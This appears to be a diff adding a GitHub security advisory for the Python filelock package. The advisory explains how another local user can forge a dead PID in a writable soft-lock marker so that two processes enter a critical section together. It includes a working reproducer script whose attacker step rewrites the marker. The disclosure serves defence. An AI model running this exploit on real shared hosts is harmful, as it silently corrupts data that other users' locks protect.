@@ -1,0 +1,113 @@
+{
+  "id": "GHSA-rfpc-qcw5-3pc4",
+  "modified": "2026-10-28T21:15:05.584943666Z",
+  "published": "2026-10-28T21:08:45Z",
+  "aliases": [
+    "CVE-2026-112939"
+  ],
+  "summary": "filelock: SoftFileLock removes a live holder's marker when another user forges the PID in a writable marker",
+  "details": "`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants and a `FileLock` that has fallen back to a soft lock on `ENOSYS` decide from the record inside the marker file whether its owner is gone. The marker is the file whose presence says a process holds the lock. They do not check who could have written that record.\n\nA local user who can write the marker but cannot remove it rewrites the holder's record to name a dead PID (process id). That position arises with an explicit `mode` with group or other write bits, or the default mode under a lax umask (the process setting that strips permission bits from new files), in a sticky or otherwise non-removable directory. The sticky bit is a directory flag that lets only a file's owner remove or rename it. The next contender running as the holder's account, or root, judges the lock stale, removes the live marker on that user's behalf and acquires it. Two processes then run the critical section together and neither gets an error. Affected versions are filelock 3.22.0 through 4.2.0 (finding `ANT-2026-W1H9NXUH`).\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` scores 4.7 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:H` (high attack complexity): the marker must carry group or other write bits (an explicit permissive `mode`, or umask `002`/`000` with a shared group), and a contender of the holder's account must ask for the lock while the forged record is in place. `I:H` (high integrity impact): two holders then write whatever the lock protects, and the holder is not told. `C:N` and `A:N` (no confidentiality or availability impact). `S:U` (scope unchanged). Classification from the review: **security, conditional** on another user being able to write the live marker. The scanner rated it high (CWE-345). The default mode under umask `022` is not affected.\n\n## Scope and preconditions\n\n- The other user can write the marker. The application passes a `mode` with group or other write bits, which `fchmod` applies as given since 4.1.0. `0o666` is a common choice for a lock shared between accounts, although a soft-lock contender of another account waits as well on a `0o644` marker, since contenders only read and rename. Or the application uses the default mode (`0o666` through the umask) under umask `002` in a directory whose group the other user belongs to, or under umask `000`. The default mode under umask `022` is not affected.\n- The other user cannot remove the marker itself: the directory is sticky, or the other user cannot write it at all (a `0755` directory owned by the lock's user gives the same overlap). In a non-sticky shared directory the other user can unlink the marker without filelock, and filelock adds nothing.\n- A contender that may rename the marker asks for the lock: another process of the holder's account (several workers of one user) or root. A contender of another unprivileged account cannot rename the marker in a sticky directory and times out.\n- The finding reaches every class that publishes a soft marker: `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async variants, and `FileLock(mode=0o666)` on a filesystem where `flock` (a kernel lock on an open file) fails with `ENOSYS`.\n\nThese protections against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against.\n\n## Affected code\n\nAt the scanned commit b831496: the create mode in [`SoftFileLock._acquire`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L67-L71), the explicit-mode `fchmod` in [`_apply_explicit_mode`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L100-L105), the trusting verdict in [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) and the [`owner_is_stale`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_identity.py#L64-L79) it relies on; the same call in [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81) and [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256).\n\n## Introduced\n\nThe stale verdict that trusts the record came in with e35c3afac473 (\"feat(soft): detect and break stale locks\", #476, 2026-02-13), first released in 3.22.0. From then on a marker left group- or other-writable by the umask is forgeable. The reproducer's exact configuration, an explicit `mode=0o666` under umask `022`, needs 66d309d (\"fix(soft): honour mode and tighten marker grammar\", #807), first released in 4.1.0. Both match the git tags.\n\n## Mechanism\n\nA contender whose `O_CREAT | O_EXCL` create fails with `EEXIST` goes to `_try_break_stale_lock`. `_read_lock_file` makes sure the path is a regular file (`lstat`, `O_NOFOLLOW` open, `fstat`) and returns its content, mtime and inode (the kernel's identity for a file, independent of its name). It has the `fstat` result in hand but does not look at `st_uid` or `st_mode`. The code parses the content into `pid`, `hostname` and start token and hands them to `owner_is_stale`, whose docstring promises to return `True` \"only when this process can prove the exact recorded owner is dead\". That proof holds only if the owner wrote the record. A process of another account that can open the marker for writing uses `O_WRONLY | O_TRUNC` (no `O_CREAT`, so `fs.protected_regular` does not block it) and writes `2147483647\\n\u003chost\u003e\\n`, keeping the host line. The host matches, PID 2147483647 does not exist, and `owner_is_stale` returns `True`.\n\n`break_lock_file` renames the marker to `\u003clock\u003e.break.\u003cpid\u003e.\u003ctoken\u003e` and unlinks it. Its mtime and inode guard compares against what the contender read after the rewrite, so it passes. The contender, which runs as the marker's owner, does the rename, so the sticky bit allows it. On the next poll the contender's `O_EXCL` create succeeds. The first holder is not told: `SoftFileLock` has no heartbeat, and on release `_unlink_open_marker` finds another inode or no file at the path and returns without an error.\n\nOther records lead to the same break, each run by the scanner the same way: the holder's own PID and host with a different third line (`owner_is_stale` reads a live PID with another start token as a recycled PID); an empty file (malformed, broken after `MALFORMED_LOCK_AGE_THRESHOLD`, 2 s). `MarkerSoftFileLock` and `SoftFileLease` apply `owner_is_stale` to the `pid=`, `host=` and `start=` fields of a protocol 2 record, and rewriting `pid=` admitted a second process for both. A `SoftFileLease` holder learns of it at its next heartbeat through `on_compromise`; `SoftFileLock` and `MarkerSoftFileLock` holders do not learn of it at all.\n\nThe marker becomes writable by another account in two ways. An explicit `mode` with group or other write bits goes through `fchmod`, so the umask does not narrow it (`test_lock_mode_soft` at the scanned commit pins `-rw-rw-rw-` under umask `022`). The default mode passes `0o666` to `os.open`, so under umask `002` the marker is `0o664`. With no `mode` argument, in a setgid and sticky group directory (`3770`), a second member of the group rewrote the marker and a second process of the holder's user acquired the same way. Under umask `000` the marker is `0o666` and any local user can rewrite it. `FileLock(mode=0o666)` on a filesystem where `flock` fails with `ENOSYS` falls back to `SoftFileLock` and produces the same `-rw-rw-rw-` marker (confirmed with `fcntl.flock` replaced by a stub raising `ENOSYS`). With `mode=0o644`, or no `mode` under umask `022`, the other user's open fails with `EACCES` and the second process times out.\n\n## Reproduction\n\nThe scanner's reproducer for `ANT-2026-W1H9NXUH`, quoted as received. It ran against commit `b831496b0273`.\n\n**`repro`**\n\n```python\n#!/usr/bin/env python3\nimport os\nimport pwd\nimport shutil\nimport stat\nimport subprocess\nimport sys\nimport tempfile\nimport time\n\n# root bypasses file permissions, so each party runs as one of the image's unprivileged accounts\nAS_VICTIM = [\"runuser\", \"-u\", \"victim\", \"--\", sys.executable]\nAS_ATTACKER = [\"runuser\", \"-u\", \"attacker\", \"--\"]\nWORKER = \"/tmp/repro.d/worker.py\"\nREWRITE_MARKER = \"/tmp/repro.d/rewrite_marker.py\"\n\n# set up: a sticky, world-writable directory like /tmp; both workers print \"entered\" / \"left\" into one shared log\nshared_dir = tempfile.mkdtemp(prefix=\"shared-\", dir=\"/tmp\")\nos.chmod(shared_dir, 0o1777)\nlock_path = os.path.join(shared_dir, \"cache.lock\")\nlog_path = os.path.join(shared_dir, \"order.log\")\nlog = open(log_path, \"w\")\n\nfirst = subprocess.Popen([*AS_VICTIM, WORKER, lock_path, \"first\", \"6\"], stdout=log)\nwhile \"first entered\" not in open(log_path).read():\n    assert first.poll() is None, \"the first worker did not get the lock\"\n    time.sleep(0.05)\n\nmarker = os.stat(lock_path)\nprint(\"marker:\", stat.filemode(marker.st_mode), pwd.getpwuid(marker.st_uid).pw_name, repr(open(lock_path).read()))\n\n# before the attack: the second worker times out, and the attacker cannot delete the marker from the sticky directory\nsecond_before = subprocess.run([*AS_VICTIM, WORKER, lock_path, \"second\", \"0.5\"], stdout=log, stderr=subprocess.PIPE, text=True)\nprint(\"second worker:\", second_before.stderr.splitlines()[-1])\nassert \"Timeout\" in second_before.stderr\nrm = subprocess.run([*AS_ATTACKER, \"rm\", \"-f\", lock_path], capture_output=True, text=True)\nprint(\"attacker:\", rm.stderr.strip())\nassert rm.returncode != 0\n\n# attack: no check=True, because under a fix the marker is not writable by others, and then this step fails\nsubprocess.run([*AS_ATTACKER, sys.executable, REWRITE_MARKER, lock_path])\nprint(\"marker after the attack:\", repr(open(lock_path).read()))\n\n# the second worker tries again, exactly as before\nsubprocess.run([*AS_VICTIM, WORKER, lock_path, \"second\", \"0.5\"], stdout=log)\nprint(\"first worker exit status:\", first.wait())\n\n# check: a correct lock keeps the second worker out until the first has left\norder = open(log_path).read().splitlines()\nprint(\"order:\", order)\nshutil.rmtree(shared_dir)\nprint(\"BUG\" if order == [\"first entered\", \"second entered\", \"second left\", \"first left\"] else \"OK\")\n```\n\n**`repro.d/rewrite_marker.py`**\n\n```python\n#!/usr/bin/env python3\n# The attacker, another account: overwrite the live holder's record in place with one naming a PID that cannot exist.\nimport os\nimport sys\n\nlock_path = sys.argv[1]\nNO_SUCH_PID = 2**31 - 1  # the largest PID the marker parser accepts; Linux pid_max is at most 2**22\n\nholder_host = open(lock_path).read().splitlines()[1]  # owner_is_stale only judges records from its own host\nmarker = os.open(lock_path, os.O_WRONLY | os.O_TRUNC)  # no O_CREAT, so fs.protected_regular does not refuse it\nos.write(marker, f\"{NO_SUCH_PID}\\n{holder_host}\\n\".encode())\nos.close(marker)\n```\n\n**`repro.d/worker.py`**\n\n```python\n#!/usr/bin/env python3\n# One of several workers of the victim's application; they take turns under a soft lock in a shared directory.\nimport sys\nimport time\n\nfrom filelock import SoftFileLock\n\nlock_path, name, work_seconds = sys.argv[1], sys.argv[2], float(sys.argv[3])\n\n# mode=0o666 so that the lock file can be used from several accounts\nwith SoftFileLock(lock_path, mode=0o666, timeout=1):\n    print(name, \"entered\", flush=True)\n    time.sleep(work_seconds)\n    print(name, \"left\", flush=True)\n```\n\n## Attack sequence\n\n```mermaid\nsequenceDiagram\n    participant H as holder (uid victim)\n    participant M as cache.lock (0666, owner victim, sticky dir)\n    participant A as other account (uid attacker)\n    participant C as contender (uid victim)\n    H-\u003e\u003eM: O_CREAT|O_EXCL create, fchmod 0o666, write \"pid host token\"\n    C-\u003e\u003eM: O_EXCL fails, read record: holder alive, Timeout\n    A-\u003e\u003eM: rm: EPERM (sticky directory)\n    rect rgb(255, 214, 214)\n        A-\u003e\u003eM: open O_WRONLY|O_TRUNC, write \"2147483647 host\"\n        C-\u003e\u003eM: read record, owner_is_stale: PID 2147483647 is dead\n        C-\u003e\u003eM: rename to cache.lock.break.*, unlink (the owner may)\n        C-\u003e\u003eC: next poll: O_EXCL succeeds, enters beside H\n        Note over H,C: both inside, no error, H's release finds another inode and returns\n    end\n```\n\n## Evidence\n\nThe scanner's reproducer runs two `victim` workers on `with SoftFileLock(path, mode=0o666, timeout=1):` in a root-owned `1777` directory under `/tmp` (overlayfs, `fs.protected_regular=2`), with `attacker` uid 1001 sharing no group with `victim`. It printed the marker as `-rw-rw-rw- victim '\u003cpid\u003e\\n\u003chost\u003e\\n\u003cstart token\u003e\\n'`, the second worker's `Timeout`, `rm: cannot remove ...: Operation not permitted` for `attacker`, the marker after the rewrite as `'2147483647\\n\u003chost\u003e\\n'`, first worker exit status 0, and the log order `['first entered', 'second entered', 'second left', 'first left']`. The second worker entered and left while the first was still inside its `with` block, about 50 ms after the rewrite, on its second poll. It prints `BUG` every time, in about 6 s. Our review ran the same reproducer: `BUG` on 4.2.0, `OK` on the head of #836. The review also tried umask `000` with the default mode.\n\n## Impact\n\nA local user who can write a soft lock's marker but cannot remove it gets a second process admitted into the critical section while the first holder is still inside. With no `lifetime` set, `SoftFileLock` and `MarkerSoftFileLock` give neither process a signal. Whatever the lock protects (a cache, an install directory, a state file) then has two concurrent writers. The other user chooses the moment and gains nothing else: it touches no file other than the marker. The process that rewrites the record runs under a different UID from the holder; the same-UID contender only follows the protocol.\n\n## Workarounds\n\nDo not give soft markers group or other write bits: pass no `mode` (or `mode=0o644`) under umask `022`. A soft-lock contender of another account waits as well on a `0o644` marker, because contenders only read and rename. The write bits matter only for the native `flock` lock and for `FileLock`'s first open before it falls back to a soft lock. Avoid umask `002` or `000` for processes that take soft locks in directories shared with other accounts, and keep lock files in a directory other users cannot write.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/836\n\n## Credits\n\nReported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\n- 2026-10-15 23:08 UTC: report received (finding `ANT-2026-W1H9NXUH`, scanned commit b831496b0273)\n- 2026-10-16 00:46 UTC: draft advisory\n- 2026-10-16 01:16 UTC: fix PR #836 opened",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "filelock",
+        "purl": "pkg:pypi/filelock"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.22.0"
+            },
+            {
+              "fixed": "4.2.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "3.22.0",
+        "3.23.0",
+        "3.24.0",
+        "3.24.1",
+        "3.24.2",
+        "3.24.3",
+        "3.25.0",
+        "3.25.1",
+        "3.25.2",
+        "3.28.0",
+        "3.29.0",
+        "3.29.1",
+        "3.29.2",
+        "3.29.3",
+        "3.29.4",
+        "3.29.5",
+        "3.29.6",
+        "3.29.7",
+        "3.30.0",
+        "3.30.1",
+        "3.30.2",
+        "3.30.3",
+        "3.31.0",
+        "3.31.1",
+        "3.31.2",
+        "3.32.0",
+        "3.32.2",
+        "3.32.3",
+        "3.32.4",
+        "3.32.5",
+        "3.32.6",
+        "3.32.7",
+        "4.0.0",
+        "4.0.1",
+        "4.0.10",
+        "4.0.11",
+        "4.0.12",
+        "4.0.2",
+        "4.0.3",
+        "4.0.4",
+        "4.0.5",
+        "4.0.6",
+        "4.0.7",
+        "4.0.8",
+        "4.0.9",
+        "4.1.0",
+        "4.1.1",
+        "4.1.2",
+        "4.2.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.2.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-rfpc-qcw5-3pc4/GHSA-rfpc-qcw5-3pc4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/security/advisories/GHSA-rfpc-qcw5-3pc4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-112939"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/pull/836"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/commit/eeceaa846cbe4df72718d94c8371ca1ab8f5b3cc"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tox-dev/filelock"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tox-dev/filelock/releases/tag/4.2.1"
+    }
+  ]
+}
